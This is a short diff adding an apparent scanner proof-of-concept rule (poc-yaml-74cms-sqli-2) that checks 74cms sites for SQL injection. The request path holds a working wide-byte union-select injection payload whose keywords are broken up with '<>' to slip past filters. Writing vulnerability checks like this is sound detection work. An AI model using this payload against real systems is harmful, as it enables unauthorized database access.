@@ -1,0 +1,12 @@
+name: poc-yaml-74cms-sqli-2
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{rand}}),5,6,7,8,9%23
+    expression: |
+      response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: rexus
+  links:
+    - https://www.uedbox.com/post/30019/
